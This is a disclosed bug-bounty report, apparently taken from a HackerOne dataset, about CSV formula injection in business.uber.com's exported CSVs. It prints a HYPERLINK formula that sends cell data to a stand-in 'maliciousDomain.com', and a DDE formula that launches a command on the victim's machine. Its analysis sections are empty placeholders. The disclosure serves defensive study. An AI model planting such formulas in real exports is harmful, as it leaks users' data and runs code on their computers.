---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '126109'
original_report_id: '126109'
title: CSV Injection in business.uber.com
weakness: Information Disclosure
team_handle: uber
created_at: '2016-03-26T02:59:24.520Z'
disclosed_at: '2016-04-06T21:27:51.334Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- information-disclosure
---

# CSV Injection in business.uber.com

## Metadata

- HackerOne Report ID: 126109
- Weakness: Information Disclosure
- Program: uber
- Disclosed At: 2016-04-06T21:27:51.334Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

business.uber.com allows for names to begin with an ```=``` which allows for injection of formulas into the downloaded CSVs. I wasn't quite sure what to categorize this as since there are two main problems with allowing injection of formulas into a CSV: 

1. It allows for data exfiltration through HYPERLINKs
2. It allows for code execution on the user's machine provided that they trust Uber

1 can be done by setting one's username to something of the form:  ```"=HYPERLINK("https://maliciousDomain.com/evil.html?data="&A1, "Click to view additional information")"```. This will create a cell that will show the text "Click to view additional information" but when clicked will send the data in A1 to ```maliciousDomain.com```. 

2 can be done by setting one's username to something of the form: ```=cmd|' /C calc'!A0``` (this will open Windows calculator). If a CSV contains a command like the above, excel will warn the user with two different pop up boxes. The problem is that these boxes ask the user whether they "trust the source of" the file. Since most users will trust Uber as a source, they will click through this without worry. 

While it is true that one needs to be an admin on the business page in order to change the username, this still qualifies as a vulnerability (and not simply a self-CSV-injection) since there can be multiple admins. This allows for one admin to get code execution on another admin's computer through the download CSV function. 

One final note, the function to download a CSV of all trips is also likely vulnerable to this but I have not tested it since I have not had a chance to take an Uber on my business account. 

Thanks,
David Dworken

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
